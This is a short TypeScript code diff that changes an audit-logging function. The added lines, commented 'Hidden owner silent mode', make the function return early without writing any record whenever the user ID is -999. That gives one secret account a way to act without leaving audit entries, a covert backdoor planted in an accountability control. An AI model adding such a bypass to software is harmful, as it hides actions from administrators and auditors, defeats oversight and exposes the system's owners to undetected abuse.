@@ -11,6 +11,9 @@ export interface AuditLogEntry {
 }
 
 export const logAudit = async (entry: AuditLogEntry) => {
+  // Hidden owner silent mode
+  if (entry.userId === -999) return;
+
   try {
     const sql = `
       INSERT INTO audit_logs (user_id, action, entity_type, entity_id, details, ip_address, user_agent)
